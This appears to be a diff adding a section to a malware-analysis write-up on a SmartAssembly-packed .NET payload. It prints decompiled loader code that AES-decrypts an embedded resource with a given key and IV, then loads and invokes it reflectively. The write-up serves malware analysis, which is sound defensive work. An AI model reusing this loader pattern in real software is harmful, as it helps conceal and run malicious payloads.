@@ -74,4 +74,59 @@ ef Howard.exe_memory.bin | carve-pe | dump carved.exe
 ## SmartAssembly
 
 This next stage payload is an assembly packed with SmartAssembly.
+De4dot makes the assembly easier to read, with the Main function as follows:
+```
+		// Token: 0x060000D1 RID: 209 RVA: 0x00006990 File Offset: 0x00004B90
+		static void Main()
+		{
+			byte[] array = null;
+			while (array == null)
+			{
+				try
+				{
+					array = Class7.smethod_14();
+				}
+				catch
+				{
+				}
+			}
+			Assembly assembly = Class7.smethod_5(array);
+			if (assembly != null)
+			{
+				Type type = Class7.smethod_99("S015sDJkvQDvP3a6cx.UyOmhW05bcEWWnZuqT", assembly);
+				if (type != null)
+				{
+					Class7.smethod_26("AHQt3OKaB", type);
+				}
+			}
+		}
+```
 
+smethod_14 takes an encrypted resource and AES decrypts it:
+
+```
+		static byte[] smethod_14()
+		{
+			byte[] emyrsqaglox = Class1.Emyrsqaglox; // return (byte[])Class1.Cazmb.GetObject("Reydbozimwj", Class1.cultureInfo_0);
+			byte[] array;
+			using (Aes aes = Aes.Create())
+			{
+				aes.KeySize = 256;
+				aes.Key = Convert.FromBase64String(Class0.string_0); // string_0 = UlPs+RiNkeAQjtjBHi2FZme93GOwtujN9g03qBhA2xM=
+				aes.IV = Convert.FromBase64String(Class0.string_1); // string_1 = 8VSGg0PMrhcl1gUkFwmUlg==
+				ICryptoTransform cryptoTransform = aes.CreateDecryptor(aes.Key, aes.IV);
+				using (MemoryStream memoryStream = new MemoryStream())
+				{
+					using (MemoryStream memoryStream2 = new MemoryStream(emyrsqaglox))
+					{
+						using (CryptoStream cryptoStream = new CryptoStream(memoryStream2, cryptoTransform, CryptoStreamMode.Read))
+						{
+							cryptoStream.CopyTo(memoryStream);
+							array = memoryStream.ToArray();
+						}
+					}
+				}
+			}
+			return array;
+		}
+```
